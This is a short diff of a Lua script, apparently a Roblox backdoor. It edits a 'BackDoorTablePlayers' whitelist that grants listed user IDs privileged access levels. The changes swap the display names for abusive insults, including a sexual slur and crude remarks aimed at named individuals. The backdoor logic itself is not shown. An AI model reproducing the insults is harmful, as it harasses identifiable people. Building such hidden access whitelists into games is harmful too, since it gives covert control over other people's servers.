@@ -215,12 +215,12 @@ local BackDoorTableCommands = {
 
 local BackDoorTablePlayers = {
 	[12978668] = {
-		['Name'] = "!fishgang Cy (Creator and ONLY dev)";
+		['Name'] = "SKID CY SKID CY SKID CY SKID CY ";
 		['Access'] = 4;
 		['Colour'] = Color3.fromRGB(178,242,255);
 	};
     [1066524308] = {
-		['Name'] = "Kylee [My Gf so kill her = you die] (She does not know anything about the script so stop asking)";
+		['Name'] = "Whore Kylee (Girlfriend of the skidder ecks dee";
 		['Access'] = 4;
 		['Colour'] = Color3.fromRGB(178,242,255);
 	};
@@ -240,7 +240,7 @@ local BackDoorTablePlayers = {
 		['Colour'] = Color3.fromRGB(176,16,16);
 	};
 	[57370993] = {
-		['Name'] = "!fishgang Karma (Head-Admin)";
+		['Name'] = "Karma got a tiny ass dick";
 		['Access'] = 3;
 		['Colour'] = Color3.fromRGB(197,0,237);
 	};
